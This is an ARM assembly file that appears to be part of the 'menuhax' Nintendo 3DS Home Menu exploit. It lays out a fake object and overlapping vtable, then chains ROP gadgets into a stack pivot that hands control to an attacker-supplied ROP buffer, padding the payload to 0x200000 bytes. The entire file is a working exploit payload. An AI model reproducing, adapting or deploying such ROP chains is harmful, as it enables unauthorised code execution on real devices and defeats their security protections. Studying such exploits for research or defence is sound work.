.arm
.section .init
.global _start

#include "menuhax_ropinclude.s"

_start:

ropstackstart:
#include "menuhax_loader.s"

object:
.word ROPBUFLOC(vtable) @ object+0, vtable ptr.
.word 0

vtable: @ Overlap the object and vtable due to lack of space, since ROP_PUSHR4R8LR_CALLVTABLEFUNCPTR uses vtable+0x28.
.word 0
.word 0
.word ROPBUFLOC(object + 0x20) @ This .word is at object+0x10. ROP_LOADR4_FROMOBJR0 loads r4 from here.
.word STACKPIVOT_ADR @ vtable funcptr +12, called via ROP_LOADR4_FROMOBJR0.
.word ROP_PUSHR4R8LR_CALLVTABLEFUNCPTR @ vtable funcptr +16. This saves {r4-r8, lr} on the stack, then calls the funcptr from vtable+0x28 below.

//.space ((object + 0x1c) - .) @ sp/pc data loaded by STACKPIVOT_ADR.

stackpivot_sploadword:
.word ROPBUFLOC(ropstackstart) @ sp
stackpivot_pcloadword:
.word ROP_POPPC @ pc

@ vtable+0x28, called by ROP_PUSHR4R8LR_CALLVTABLEFUNCPTR. This then does the usual stack-pivot.
.space ((vtable + 0x28) - .)
.word ROP_LOADR4_FROMOBJR0

@ objptr loaded by ROP_PUSHR4R8LR_CALLVTABLEFUNCPTR.
//.space ((object + 0x34) - .)
.word ROPBUFLOC(object)

.fill (((_start + 0x200000) - .) / 4), 4, 0x30303030

